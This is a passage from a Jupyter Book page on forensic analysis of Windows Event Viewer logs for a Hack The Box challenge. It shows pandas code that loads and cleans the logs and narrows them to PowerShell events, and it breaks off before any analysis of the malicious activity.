@@ -1,0 +1,1621 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+    <title>Simple Analysis of Windows Event Viewer Logs &#8212; Data Science for Cybersecurity</title>
+    
+  <!-- Loaded before other Sphinx assets -->
+  <link href="_static/styles/theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+<link href="_static/styles/pydata-sphinx-theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    <link rel="stylesheet" type="text/css" href="_static/pygments.css" />
+    <link rel="stylesheet" href="_static/styles/sphinx-book-theme.css?digest=62ba249389abaaa9ffc34bf36a076bdc1d65ee18" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="_static/design-style.b7bb847fb20b106c3d81b95245e65545.min.css" />
+    
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf">
+
+    <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
+    <script src="_static/jquery.js"></script>
+    <script src="_static/underscore.js"></script>
+    <script src="_static/doctools.js"></script>
+    <script src="_static/clipboard.min.js"></script>
+    <script src="_static/copybutton.js"></script>
+    <script src="_static/scripts/sphinx-book-theme.js?digest=f31d14ad54b65d19161ba51d4ffff3a77ae00456"></script>
+    <script>let toggleHintShow = 'Click to show';</script>
+    <script>let toggleHintHide = 'Click to hide';</script>
+    <script>let toggleOpenOnPrint = 'true';</script>
+    <script src="_static/togglebutton.js"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="_static/design-tabs.js"></script>
+    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"
+const thebe_selector = ".thebe,.cell"
+const thebe_selector_input = "pre"
+const thebe_selector_output = ".output, .cell_output"
+</script>
+    <script async="async" src="_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="prev" title="Data Science for Cybersecurity" href="index.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="60">
+<!-- Checkboxes to toggle the left sidebar -->
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation" aria-label="Toggle navigation sidebar">
+<label class="overlay overlay-navbar" for="__navigation">
+    <div class="visually-hidden">Toggle navigation sidebar</div>
+</label>
+<!-- Checkboxes to toggle the in-page toc -->
+<input type="checkbox" class="sidebar-toggle" name="__page-toc" id="__page-toc" aria-label="Toggle in-page Table of Contents">
+<label class="overlay overlay-pagetoc" for="__page-toc">
+    <div class="visually-hidden">Toggle in-page Table of Contents</div>
+</label>
+<!-- Headers at the top -->
+<div class="announcement header-item noprint"></div>
+<div class="header header-item noprint"></div>
+
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<!-- Sidebar -->
+<div class="bd-sidebar noprint" id="site-navigation">
+    <div class="bd-sidebar__content">
+        <div class="bd-sidebar__top"><div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="index.html">
+      
+        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
+        
+      
+      
+      <img src="_static/logo.png" class="logo" alt="logo">
+      
+      
+      <h1 class="site-logo" id="site-title">Data Science for Cybersecurity</h1>
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        
+        <ul class="nav bd-sidenav bd-sidenav__home-link">
+            <li class="toctree-l1">
+                <a class="reference internal" href="index.html">
+                    Data Science for Cybersecurity
+                </a>
+            </li>
+        </ul>
+        <ul class="current nav bd-sidenav">
+ <li class="toctree-l1 current active">
+  <a class="current reference internal" href="#">
+   Simple Analysis of Windows Event Viewer Logs
+  </a>
+ </li>
+</ul>
+
+    </div>
+</nav></div>
+        <div class="bd-sidebar__bottom">
+             <!-- To handle the deprecated key -->
+            
+            <div class="navbar_extra_footer">
+            Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+            </div>
+            
+        </div>
+    </div>
+    <div id="rtd-footer-container"></div>
+</div>
+
+
+          
+
+
+          
+<!-- A tiny helper pixel to detect if we've scrolled -->
+<div class="sbt-scroll-pixel-helper"></div>
+<!-- Main content -->
+<div class="col py-0 content-container">
+    
+    <div class="header-article row sticky-top noprint">
+        
+
+
+
+<div class="col py-1 d-flex header-article-main">
+    <div class="header-article__left">
+        
+        <label for="__navigation"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="right"
+title="Toggle navigation"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-bars"></i>
+  </span>
+
+</label>
+
+        
+    </div>
+    <div class="header-article__right">
+<button onclick="toggleFullScreen()"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="bottom"
+title="Fullscreen mode"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+<div class="menu-dropdown menu-dropdown-repository-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Source repositories">
+      <i class="fab fa-github"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="https://github.com/executablebooks/jupyter-book"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Source repository"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fab fa-github"></i>
+  </span>
+<span class="headerbtn__text-container">repository</span>
+</a>
+
+      </li>
+      
+      <li>
+        <a href="https://github.com/executablebooks/jupyter-book/issues/new?title=Issue%20on%20page%20%2Fsimple_analysis.html&body=Your%20issue%20content%20here."
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Open an issue"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-lightbulb"></i>
+  </span>
+<span class="headerbtn__text-container">open issue</span>
+</a>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+
+<div class="menu-dropdown menu-dropdown-download-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Download this page">
+      <i class="fas fa-download"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="_sources/simple_analysis.md"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Download source file"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="headerbtn__text-container">.md</span>
+</a>
+
+      </li>
+      
+      <li>
+        
+<button onclick="printPdf(this)"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="left"
+title="Print to PDF"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="headerbtn__text-container">.pdf</span>
+</button>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+<label for="__page-toc"
+  class="headerbtn headerbtn-page-toc"
+  
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-list"></i>
+  </span>
+
+</label>
+
+    </div>
+</div>
+
+<!-- Table of contents -->
+<div class="col-md-3 bd-toc show noprint">
+    <div class="tocsection onthispage pt-5 pb-3">
+        <i class="fas fa-list"></i> Contents
+    </div>
+    <nav id="bd-toc-nav" aria-label="Page">
+        <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#introduction">
+   Introduction
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#packages">
+   Packages
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#preprocessing">
+   Preprocessing
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#understanding-the-dataset">
+   Understanding the dataset
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#defining-the-subset-of-interest">
+   Defining the subset of interest
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#planning-the-analysis-of-the-malicious-events">
+   Planning the analysis of the malicious events
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#the-analysis-of-the-activity-which-was-blocked-or-failed">
+   The analysis of the activity which was blocked or failed
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#an-overview-of-the-activity-which-failed">
+   An overview of the activity which failed
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#assigning-additional-attributes-user-account-urls-malicious-function-s-name-and-its-description">
+   Assigning additional attributes: user account, URLs, malicious function’s name and its description
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#malicious-activity-which-got-blocked-or-failed-an-overview">
+   Malicious activity which got blocked or failed: an overview
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#successful-malicious-activity">
+   Successful malicious activity
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#activity-visualization">
+   Activity visualization
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#usage-of-services-during-the-time-of-the-malicious-activity">
+   Usage of services during the time of the malicious activity
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#conclusion">
+   Conclusion
+  </a>
+ </li>
+</ul>
+
+    </nav>
+</div>
+    </div>
+    <div class="article row">
+        <div class="col pl-md-3 pl-lg-5 content-container">
+            <!-- Table of contents that is only displayed when printing the page -->
+            <div id="jb-print-docs-body" class="onlyprint">
+                <h1>Simple Analysis of Windows Event Viewer Logs</h1>
+                <!-- Table of contents -->
+                <div id="print-main-content">
+                    <div id="jb-print-toc">
+                        
+                        <div>
+                            <h2> Contents </h2>
+                        </div>
+                        <nav aria-label="Page">
+                            <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#introduction">
+   Introduction
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#packages">
+   Packages
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#preprocessing">
+   Preprocessing
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#understanding-the-dataset">
+   Understanding the dataset
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#defining-the-subset-of-interest">
+   Defining the subset of interest
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#planning-the-analysis-of-the-malicious-events">
+   Planning the analysis of the malicious events
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#the-analysis-of-the-activity-which-was-blocked-or-failed">
+   The analysis of the activity which was blocked or failed
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#an-overview-of-the-activity-which-failed">
+   An overview of the activity which failed
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#assigning-additional-attributes-user-account-urls-malicious-function-s-name-and-its-description">
+   Assigning additional attributes: user account, URLs, malicious function’s name and its description
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#malicious-activity-which-got-blocked-or-failed-an-overview">
+   Malicious activity which got blocked or failed: an overview
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#successful-malicious-activity">
+   Successful malicious activity
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#activity-visualization">
+   Activity visualization
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#usage-of-services-during-the-time-of-the-malicious-activity">
+   Usage of services during the time of the malicious activity
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#conclusion">
+   Conclusion
+  </a>
+ </li>
+</ul>
+
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            <main id="main-content" role="main">
+                
+              <div>
+                
+  <section class="tex2jax_ignore mathjax_ignore" id="simple-analysis-of-windows-event-viewer-logs">
+<h1>Simple Analysis of Windows Event Viewer Logs<a class="headerlink" href="#simple-analysis-of-windows-event-viewer-logs" title="Permalink to this headline">#</a></h1>
+<section id="introduction">
+<h2>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">#</a></h2>
+<p>This analysis is based on the concept of executing specific queries to filter and access particular data. This is why I call it simple, however, good querying skills can be powerful and advanced tool. It relies on the information which has been already given: the attackers compromised the machine, they attempted to clean the evidence of their activity perhaps some trace is hidden in events related to PowerShell.</p>
+<p>The task is a part of a challenge <em>Event Horizon</em> on Hack The Box platform (<a class="reference external" href="http://hackthebox.com">hackthebox.com</a>).</p>
+</section>
+<section id="packages">
+<h2>Packages<a class="headerlink" href="#packages" title="Permalink to this headline">#</a></h2>
+<p>From the standard set of libraries, we will need the following packages:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
+<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">seaborn</span> <span class="k">as</span> <span class="nn">sns</span>
+<span class="n">sns</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>For loading the data and preprocessing it prior to the analysis, my own, local libraries will be used: for building, cleaning and preprocessing the dataset.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">src.data_cleaning.datasetBuilder</span> <span class="kn">import</span> <span class="n">DatasetBuilder</span>
+<span class="kn">from</span> <span class="nn">src.data_cleaning.datasetCleaner</span> <span class="kn">import</span> <span class="n">DatasetCleaner</span>
+<span class="kn">from</span> <span class="nn">src.time_analysis.timeStepPreprocessor</span> <span class="kn">import</span> <span class="n">TimeStepPreprocessor</span>
+</pre></div>
+</div>
+</section>
+<section id="preprocessing">
+<h2>Preprocessing<a class="headerlink" href="#preprocessing" title="Permalink to this headline">#</a></h2>
+<p>First, the dataset is assembled from seperate CSV files representing each log file. They contain data on the events related to different services such as <em>Windows File Recovery</em>, <em>Windows App Container</em>, etc. <br>
+After the complete dataset is constructed, the time stamp is split into 2 attributes - one for the date and the other for the time. This allows for grouping the events in an easier way, without calling <strong>datetime</strong> class methods in order to group by date or hour within a single timestamp attribute. <br>
+Finally, when the timestamp information is represented in a more convenient format, the dataset must be prepared for the analysis of details related to each event: all records containing missing values in the <em>Message</em> attribute are discarded. This is because neither would it be possible to work on missing values, nor to perform an accurate imputation based on other variables in a row.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">data</span> <span class="o">=</span> <span class="n">DatasetBuilder</span><span class="p">(</span><span class="s2">&quot;src/data&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">buildDataset</span><span class="p">()</span>
+<span class="n">tsp</span> <span class="o">=</span> <span class="n">TimeStepPreprocessor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s2">&quot;TimeCreated&quot;</span><span class="p">)</span>
+<span class="n">tsp</span><span class="o">.</span><span class="n">preprocessTimeSteps</span><span class="p">()</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">tsp</span><span class="o">.</span><span class="n">preprocessed_date_time</span>
+<span class="n">cleaner</span> <span class="o">=</span> <span class="n">DatasetCleaner</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s2">&quot;Message&quot;</span><span class="p">)</span>
+<span class="n">cleaned_data</span> <span class="o">=</span> <span class="n">cleaner</span><span class="o">.</span><span class="n">removeNullValues</span><span class="p">(</span><span class="n">generate_report</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">/</span> <span class="n">data</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;%&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>(48231, 28)
+(16069, 28)
+33.317%
+</pre></div>
+</div>
+<p>After cleaning the dataset, we will be working with approximately one-third of the original number of records.</p>
+</section>
+<section id="understanding-the-dataset">
+<h2>Understanding the dataset<a class="headerlink" href="#understanding-the-dataset" title="Permalink to this headline">#</a></h2>
+<p>As a part of data understanding let us study the attributes and their values.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">attribute</span> <span class="ow">in</span> <span class="n">cleaned_data</span><span class="o">.</span><span class="n">columns</span><span class="p">:</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">attribute</span> <span class="o">==</span> <span class="s2">&quot;ContainerLog&quot;</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="s2">&quot;---------------&quot;</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">cleaned_data</span><span class="p">[</span><span class="n">attribute</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cleaned_data</span><span class="p">[</span><span class="n">attribute</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">:</span>
+            <span class="n">output</span> <span class="o">=</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">attribute</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="mi">0</span><span class="p">][:</span><span class="mi">50</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">output</span> <span class="o">=</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">attribute</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">attribute</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ATTRIBUTE: </span><span class="si">{</span><span class="n">attribute</span><span class="si">}</span><span class="s2"> : EXAMPLE VALUE: </span><span class="si">{</span><span class="n">output</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>ATTRIBUTE: Message : EXAMPLE VALUE: Capability change on {2e722116-8b3b-472d-a7de-f7de
+ATTRIBUTE: Id : EXAMPLE VALUE: 4042
+ATTRIBUTE: Version : EXAMPLE VALUE: 0.0
+ATTRIBUTE: Qualifiers : EXAMPLE VALUE: nan
+ATTRIBUTE: Level : EXAMPLE VALUE: 4
+ATTRIBUTE: Task : EXAMPLE VALUE: 0
+ATTRIBUTE: Opcode : EXAMPLE VALUE: 0.0
+ATTRIBUTE: Keywords : EXAMPLE VALUE: 4611686018427387936
+ATTRIBUTE: RecordId : EXAMPLE VALUE: 16
+ATTRIBUTE: ProviderName : EXAMPLE VALUE: Microsoft-Windows-NCSI
+ATTRIBUTE: ProviderId : EXAMPLE VALUE: 314de49f-ce63-4779-ba2b-d616f6963a88
+ATTRIBUTE: LogName : EXAMPLE VALUE: Microsoft-Windows-NCSI/Operational
+ATTRIBUTE: ProcessId : EXAMPLE VALUE: 1396.0
+ATTRIBUTE: ThreadId : EXAMPLE VALUE: 1448.0
+ATTRIBUTE: MachineName : EXAMPLE VALUE: WIN-PTFPHFCRDJ0
+ATTRIBUTE: UserId : EXAMPLE VALUE: S-1-5-20
+ATTRIBUTE: ActivityId : EXAMPLE VALUE: nan
+ATTRIBUTE: RelatedActivityId : EXAMPLE VALUE: nan
+ATTRIBUTE: MatchedQueryIds : EXAMPLE VALUE: System.UInt32[]
+ATTRIBUTE: Bookmark : EXAMPLE VALUE: System.Diagnostics.Eventing.Reader.EventBookmark
+ATTRIBUTE: LevelDisplayName : EXAMPLE VALUE: Information
+ATTRIBUTE: OpcodeDisplayName : EXAMPLE VALUE: Info
+ATTRIBUTE: TaskDisplayName : EXAMPLE VALUE: nan
+ATTRIBUTE: KeywordsDisplayNames : EXAMPLE VALUE: System.Collections.ObjectModel.ReadOnlyCollection`
+ATTRIBUTE: Properties : EXAMPLE VALUE: System.Collections.Generic.List`1[System.Diagnosti
+ATTRIBUTE: Date : EXAMPLE VALUE: 26/10/2020
+ATTRIBUTE: Time : EXAMPLE VALUE: 18:58:15
+</pre></div>
+</div>
+<p>As well as the summary of the dataset attributes’ values.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">info</span><span class="p">()</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
+Int64Index: 16069 entries, 0 to 48230
+Data columns (total 28 columns):
+ #   Column                Non-Null Count  Dtype  
+---  ------                --------------  -----  
+ 0   Message               16069 non-null  object 
+ 1   Id                    16069 non-null  int64  
+ 2   Version               15912 non-null  float64
+ 3   Qualifiers            2038 non-null   float64
+ 4   Level                 16069 non-null  int64  
+ 5   Task                  16069 non-null  int64  
+ 6   Opcode                15912 non-null  float64
+ 7   Keywords              16069 non-null  int64  
+ 8   RecordId              16069 non-null  int64  
+ 9   ProviderName          16069 non-null  object 
+ 10  ProviderId            15912 non-null  object 
+ 11  LogName               16069 non-null  object 
+ 12  ProcessId             15912 non-null  float64
+ 13  ThreadId              15912 non-null  float64
+ 14  MachineName           16069 non-null  object 
+ 15  UserId                12368 non-null  object 
+ 16  ActivityId            3882 non-null   object 
+ 17  RelatedActivityId     0 non-null      float64
+ 18  ContainerLog          16069 non-null  object 
+ 19  MatchedQueryIds       16069 non-null  object 
+ 20  Bookmark              16069 non-null  object 
+ 21  LevelDisplayName      16069 non-null  object 
+ 22  OpcodeDisplayName     14082 non-null  object 
+ 23  TaskDisplayName       4090 non-null   object 
+ 24  KeywordsDisplayNames  16069 non-null  object 
+ 25  Properties            16069 non-null  object 
+ 26  Date                  16069 non-null  object 
+ 27  Time                  16069 non-null  object 
+dtypes: float64(6), int64(5), object(17)
+memory usage: 3.6+ MB
+</pre></div>
+</div>
+<p>As seen above, the most problematic attributes in terms of the missing values are <em>RelatedActivityId</em>, <em>Qualifiers</em>, <em>ActivityId</em>, <em>TaskDisplayName</em>.</p>
+<p>Next, a directory to which the reports and visualizations will be saved is created. This allows for keeping outputs organized and to store all the findings to the disk.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports&quot;</span><span class="p">):</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>As it is stated in the challenge descriptions, the attackers most likely used PowerShell. This is a key information in the data understanding process (for instance one of the steps in the CRISP-DM methodology), as we can narrow down the queries to only the records which are related to PowerShell processes. Therefore, first we need to find a way to obtain relevant subset of the dataset. In this case, the <em>ProviderName</em> attribute values represent entities or services which manage a task. This can be TaskScheduler, a web authentication service, Windows kernel I/O manager (Microsoft-Windows-Kernel-IO).</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Example ProviderName entities:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span><span class="o">.</span><span class="n">unique</span><span class="p">()[:</span><span class="mi">5</span><span class="p">]:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Example ProviderName entities:
+
+Microsoft-Windows-NCSI
+Microsoft-Windows-Kernel-PnP
+Microsoft-Windows-WMI-Activity
+Microsoft-Windows-Security-SPP
+VSS
+</pre></div>
+</div>
+<p>Among these categories there should be some related to PowerShell, we can check which of them contain a substring “power”. To do this, let’s iterate over the unique values again, but this time a conditional statement is added to check if “power” is contained within each of String values of the list. If it is, we print out these values. We get four Strings which match the criterion and we find the most probable one: <em>Microsoft-Windows-PowerShell</em>. We can assume that records with this categorical value in the <em>ProviderName</em> attribute will be relevant for the analysis.</p>
+</section>
+<section id="defining-the-subset-of-interest">
+<h2>Defining the subset of interest<a class="headerlink" href="#defining-the-subset-of-interest" title="Permalink to this headline">#</a></h2>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">provider</span> <span class="ow">in</span> <span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+    <span class="k">if</span> <span class="s2">&quot;power&quot;</span> <span class="ow">in</span> <span class="n">provider</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">provider</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Microsoft-Windows-Kernel-Processor-Power
+Microsoft-Windows-Kernel-Power
+Microsoft-Windows-UserModePowerService
+Microsoft-Windows-PowerShell
+</pre></div>
+</div>
+<p>We can check the shape of the subset of interest. As seen below, its number of records is 149 and its arity (number of attributes) is 28, as we did not drop nor added any of the columns since data preprocessing.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">shape</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>(149, 28)
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
